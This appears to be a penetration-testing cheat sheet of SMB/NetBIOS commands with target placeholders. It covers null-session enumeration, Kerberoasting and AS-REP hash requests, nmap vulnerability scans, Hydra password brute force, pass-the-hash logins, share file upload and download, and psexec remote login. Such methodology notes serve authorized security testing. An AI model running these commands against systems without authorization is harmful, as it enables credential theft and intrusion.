# port: 137,138,139

# desc: [INFO]
Notes
# """#While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

https://book.hacktricks.xyz/pentesting/pentesting-smb
"""

--- With No Creds
nbtscan #{RHOST}

# desc: 获取域名名称
smbmap -H #{RHOST}

smbmap -H #{RHOST} -u null -p null

# desc: 获取共享目录
smbclient -N -L //#{RHOST}

smbclient -N //#{RHOST}/ --option="client min protocol"=LANMAN1

rpcclient #{RHOST}

rpcclient -U "" #{RHOST}

crackmapexec smb #{RHOST}

crackmapexec smb #{RHOST} --pass-pol -u "" -p ""

GetADUsers.py -dc-ip #{RHOST} "#{DOMAIN}/" -all

GetNPUsers.py -dc-ip #{RHOST} -request "#{DOMAIN}/" -format hashcat

GetUserSPNs.py -dc-ip #{RHOST} -request "#{DOMAIN}/"

getArch.py -target #{RHOST}

--- With Creds

smbmap -H #{RHOST} -u #{USER} -p #{PWD}

smbclient -h "\\\\#{RHOST}\\\" -U #{DOMAIN} -W #{USER} -l #{RHOST}

smbclient -h "\\\\#{RHOST}\\\" -U #{DOMAIN} -W #{USER} -l #{RHOST} --pw-nt-hash `hash`

crackmapexec smb #{RHOST} -u #{USER} -p #{PWD} --shares

GetADUsers.py #{DOMAIN}/#{USER}:#{PWD} -all

GetNPUsers.py #{DOMAIN}/#{USER}:#{PWD} -request -format hashcat

GetUserSPNs.py #{DOMAIN}/#{USER}:#{PWD} -request


--- General & Vuln Scan

# General SMB Scan
# desc:Enum4Linux
enum4linux -a #{RHOST}

# SMB Vuln Scan With Nmap
# desc:Nmap SMB Scan 1
nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse #{RHOST}

# SMB Vuln Scan With Nmap (Less Specific)
# desc:Nmap Smb Scan 2
nmap --script smb-vuln* -Pn -p 139,445 #{RHOST}

# Search smb exploit
# desc: 漏洞搜索
searchsploit microsoft smb

# Dump interesting information
enum4linux -a -u "#{USER}" #{[-p ]PWD} #{RHOST}

# MSF search
msfconsole -x "search type:exploit platform:windows target:2008 smb"

--- Brute Force

# Need User
# desc:Hydra Brute Force
hydra -t 1 -V -f -l #{USER} -P #{Big_Passwordlist} #{RHOST} smb

--- POST

# Entry folder with Null User and no pass
# desc: Entry folder
smbclient //#{RHOST}/#{folder} #{[-U ]USER}

# List recursively with smbclient
# desc: smbclient 文件夹递归查询
smbclient -U '#{USER}#{[%]PWD}' #{[--pw-nt-hash ]ntlm} //#{RHOST}/#{folder} -c 'recurse;ls'
@folder.desc(SMB Share Folder)

# desc: smbmap 文件夹递归查询
smbmap -R #{folder} -H #{RHOST} -u #{USER} #{[-p ]PWD}

# download files
# desc: 下载文件
smbmap -H #{RHOST} -u #{USER} #{[-p] PWD} --download '#{file_fullpath}'
@file_fullpath.desc(文件完整路径)

# desc: 上传文件
smbmap -H #{RHOST} -u #{USER} #{[-p] PWD} --upload '#{src_file} #{dst_file}' 
@src_file.desc(源文件路径)
@dst_file.desc(目的文件路径)

# desc: Login
# refer: https://docs.microsoft.com/en-us/sysinternals/downloads/psexec (Psexec Usage)
# 通过139端口登录到目标机
psexec.py #{USER}@#{RHOST}

@smbmap_port.desc(SMB Port)
@smbmap_port.recommend(445 (SSH))
@smbmap_port.recommend(139)

@ntlm.desc(NTLM)

@folder.recommend(C$)
@folder.recommend(D$)
@folder.recommend(ADMIN$)
@folder.recommend(IPC$)
@folder.recommend(PRINT$)
@folder.recommend(SYSVOL$)
@folder.recommend(FAX$)
@folder.recommend(NETLOGON$)


@USER.recommend(guest (匿名用户))